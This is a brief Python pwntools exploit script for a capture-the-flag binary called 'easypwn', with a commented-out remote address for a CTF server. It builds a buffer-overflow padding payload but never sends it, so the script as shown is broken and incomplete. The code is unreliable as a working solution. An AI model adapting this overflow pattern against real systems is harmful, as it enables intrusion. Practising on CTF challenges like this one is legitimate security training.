from pwn import *

p = process('./easypwn')
# p = remote('node6.anna.nssctf.cn', 28171)
payload = b'a' * 0x1f
p.recvuntil(b'This is the wrong password:')
p.interactive()
